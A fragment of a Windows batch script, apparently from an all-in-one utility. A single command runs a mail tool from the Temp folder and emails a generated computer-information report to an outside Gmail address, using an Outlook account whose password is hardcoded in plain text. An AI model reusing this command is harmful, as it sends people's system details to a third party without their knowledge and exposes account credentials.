...
start /wait "%USERPROFILE%\AppData\Local\Temp\AIO\chefsender.exe" /smtp-server:smtp-mail.outlook.com /to:coff33ninja69@gmail.com /smtp-user:"hltworkshop@outlook.com" /smtp-password:"HLTP@ssw0rd1" /port:587 /ssl /from-name:TEST /from-mail:hltworkshop@outlook.com /sub:"ComputerINFO" /html /attach:"C:\aio\Basic-Computer-Information-Report.html"
